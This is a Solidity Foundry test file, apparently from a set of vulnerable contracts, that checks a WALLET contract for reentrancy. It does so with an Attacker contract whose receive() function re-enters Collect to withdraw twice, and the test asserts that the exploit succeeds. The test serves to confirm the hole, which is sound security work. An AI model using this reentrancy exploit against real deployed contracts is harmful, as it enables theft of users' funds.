
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET, Log} from "../src/WALLET.sol";

contract TestReentrancyWALLET is Test {

    WALLET public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        _contractUnderTest = new WALLET(address(log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 stateVal, uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max / 2);
        vm.assume(stateVal >= attackVal * 2);
        vm.assume(stateVal <= type(uint128).max);
        

        vm.warp(block.timestamp + 100);

        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), stateVal * 2);

        _attacker.setupAttack{value: stateVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.Acc(address(this)).balance;

        victim.Collect(attackAmount);

        uint256 finalSnapshot = victim.Acc(address(this)).balance;
        if (finalSnapshot == initialSnapshot - 2 * attackAmount && attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }
}
